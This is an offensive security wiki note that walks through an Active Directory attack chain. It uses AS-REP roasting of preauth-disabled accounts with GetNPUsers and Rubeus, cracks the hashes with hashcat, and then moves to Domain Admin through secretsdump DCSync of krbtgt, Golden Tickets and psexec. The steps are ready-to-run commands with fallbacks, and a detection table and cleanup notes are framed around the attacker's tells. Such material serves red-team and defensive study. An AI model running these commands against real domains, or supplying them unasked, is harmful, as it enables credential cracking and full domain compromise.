---
title: "Attack Path: AS-REP Roasting (preauth-disabled account) → Cracked Password → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, asrep-roasting, credential-access, privilege-escalation]
---

# Attack Path: AS-REP Roasting → Cracked Password → Domain Admin

The **[[as-rep-roasting]]** kill-chain: target accounts with **Kerberos
pre-auth disabled** (`DONT_REQ_PREAUTH` / `userAccountControl` bit `4194304`),
request an **AS-REP** for each (no domain creds needed for the request itself),
and crack the returned blob — it's encrypted with **that user's password
hash**. If one of those preauth-disabled accounts is **privileged** (a DA, a
member of a privileged group, or holds a DCSync right), the cracked password is
a direct path to domain dominance. This is the "enumerate the forest, find the
odd one out" path — the misconfiguration (preauth off) *is* the foothold. See
[[as-rep-roasting]] for the request + crack mechanics, [[kerberos-preauth]]
for why disabling pre-auth exposes the hash, and [[service-account]] for
account types.

## Chain

```
You (a username list, ideally one domain cred for LDAP enumeration)
  --GetNPUsers / Rubeus asreproast--> AS-REP blobs for preauth-disabled accounts
  --crack (hashcat 18200 RC4 / 19600-19700 AES)--> a user's password
  --that account is privileged (DA / DCSync right / AdminTo)-->
  use the password (or its NT hash) --> Domain Admin
```

## Prerequisites / what signals this path exists

- A **username list** to enumerate (the whole domain's sAMAccountNames is
  ideal). Enumeration usually needs a **valid domain cred** for an LDAP bind —
  though the AS-REP *request itself* needs none.
- At least one account with **pre-auth disabled**. Find them:

```bash
# Enumerate preauth-disabled accounts + request AS-REP (hashcat format)
GetNPUsers.py -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat -outputfile asrep.txt
# (or: Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat)
# (or: PowerView: Get-DomainUser -PreauthNotRequired -Properties samaccountname)
```
**Verify:** `asrep.txt` has a line per preauth-disabled account that returned a
blob. An empty file means nobody has pre-auth off — this path is closed
(pivot to [[kerberoasting]] or an ACL path).

## Step 1 — Request the AS-REP blobs

```bash
GetNPUsers.py -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat -outputfile asrep.txt
```
**Verify:** non-empty `asrep.txt`. Each line is `$krb5asrep$<etype>$user@DOMAIN:...`.
See [[as-rep-roasting]].

### Failure modes & fallbacks
- **No preauth-disabled accounts** — the domain enforces pre-auth; this path is
  closed. Fall back to [[kerberoasting]] (SPN accounts) or an ACL/GPO path.
- **The account has AES-only** — the blob is AES-encrypted; crack with
  `19600`/`19700` (slower) instead of RC4 `18200`. See
  [[kerberos-encryption-types]].

## Step 2 — Crack the AS-REP blobs

```bash
# RC4 (the common case)
hashcat -m 18200 asrep.txt rockyou.txt
# AES fallback
hashcat -m 19600 asrep.txt rockyou.txt   # AES128
hashcat -m 19700 asrep.txt rockyou.txt   # AES256
```
**Verify:** a cracked password for a user (e.g. `svc_backup` or, jackpot, a
privileged account). See [[hashcat]] / [[john-the-ripper]].

### Failure modes & fallbacks
- **Strong password** — none crack from rockyou; try a mask for the domain
  policy, or pivot to a different technique.
- **The cracked account is low-priv** — you have a user, not a DA. Use it for
  **enumeration** (an LDAP cred unlocks the full directory read) and re-check
  the graph for edges from that account.

## Step 3 — Confirm the cracked account's privileges

Before assuming domain dominance, verify what the cracked account actually
holds:

```powershell
# Is it a DA / in a privileged group?
Get-DomainUser -Identity <cracked-user> -Properties memberof,memberofresolved
# Does it hold a DCSync right? (BloodHound: <user> -> GetChangesAll)
Get-DomainObjectAcl -Identity <domain> -ResolvedRights   # check GetChanges/GetChangesAll
```
**Verify:** the account is a Domain Admin, **or** holds a DCSync right,
**or** has an AdminTo/AdministerTo edge to a Tier-0 box. This decides step 4.

## Step 4 — Domain dominance

```bash
# If it's a DA (or holds DCSync):
secretsdump.py -dc-ip <dc> corp.local/<user>:<cracked-pw> -just-dc-user krbtgt
# -> krbtgt -> Golden Ticket -> Administrator (see golden-silver-tickets)

# Or just use the account directly:
psexec.py -dc-ip <dc> corp.local/<user>:<cracked-pw>@dc01.corp.local
```
**Verify:** `whoami /all` shows Domain Admins membership (or you've dumped
`krbtgt`). See [[dcsync]], [[golden-silver-tickets]].

### Failure modes & fallbacks
- **Not a DA, no DCSync** — you have a good user; use it to **enumerate**
  (LDAP cred) and re-evaluate the graph for a privesc edge. A cracked
  preauth-disabled user is often a **service account** with local admin
  somewhere ([[service-account]]) — lateral from there.
- **Account locked** after crack attempts — wait for unlock or use the NT
  hash directly ([[overpass-the-hash]]).

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (AS-REQ) | **4768** with **Pre-Authentication Type = 0** for many accounts | a burst of no-preauth AS-REQs |
| 1 (enum) | LDAP queries for `userAccountControl` (4661/5136-read) | directory enumeration for the bit |
| 3 (DCSync) | **4662** on the domain object (GetChanges+GetChangesAll) | the account replicating |
| 4 (DA) | 4624 Type 3/10 for the privileged account / Administrator | DA logons |

## Cleanup notes
- The **4768 Preauth-Type-0** burst is the loud, durable tell — expect it to be
  reviewed.
- A cracked **preauth-disabled** account is a known-bad pattern; expect it to
  be reset (and pre-auth re-enabled).
- If you DCSync'd, expect `krbtgt` to rotate twice if caught ([[krbtgt]]).

## Related
- [[as-rep-roasting]] — the request + crack primitive (steps 1-2)
- [[kerberos-preauth]] — why pre-auth off exposes the hash
- [[kerberos-encryption-types]] — RC4/AES blob cracking
- [[hashcat]], [[john-the-ripper]] — the crack engines
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[overpass-the-hash]] — use the cracked account's NT hash for a real TGT
- [[service-account]] — why a preauth-disabled account is often a service acct
- [[ad-persistence]] — durable access once you're DA
